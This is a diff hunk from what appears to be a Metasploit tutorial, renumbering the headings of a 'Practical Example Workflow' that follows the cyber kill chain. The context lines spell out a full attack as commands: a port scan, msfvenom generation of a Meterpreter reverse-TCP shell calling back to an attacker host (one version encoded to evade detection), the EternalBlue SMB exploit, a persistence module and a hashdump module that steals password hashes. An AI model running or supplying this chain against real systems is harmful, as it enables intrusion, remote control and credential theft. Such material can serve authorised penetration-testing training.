@@ -30,19 +30,19 @@ spool off
 ---
 
 # Practical Example Workflow:
-## Reconnaissance:
+## 1. Reconnaissance:
 ```
 Load auxiliary module: use auxiliary/scanner/portscan/tcp
 Set RHOSTS: set RHOSTS 192.168.1.100
 Run the scan: run
 ```
 
-## Weaponization:
+## 2. Weaponization:
 ```
 Generate payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f exe -o shell.exe
 ```
 
-## Delivery:
+## 3. Delivery:
 ```
 Load exploit module: use exploit/windows/smb/ms17_010_eternalblue
 Set payload: set payload windows/meterpreter/reverse_tcp
@@ -50,24 +50,24 @@ Set RHOST: set RHOST 192.168.1.100
 Run the exploit: run
 ```
 
-## Exploitation:
+## 4. Exploitation:
 ```
 Meterpreter session opened (assuming successful exploitation).
 ```
 
-## Installation:
+## 5. Installation:
 ```
 Load post-exploitation module: use post/windows/manage/persistence
 Set session: set SESSION 1
 Run the module: run
 ```
 
-## Command and Control (C2):
+## 6. Command and Control (C2):
 ```
 Encode payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded_shell.exe
 ```
 
-## Actions on Objectives:
+## 7. Actions on Objectives:
 ```
 Load post-exploitation module: use post/windows/gather/hashdump
 Set session: set SESSION 1
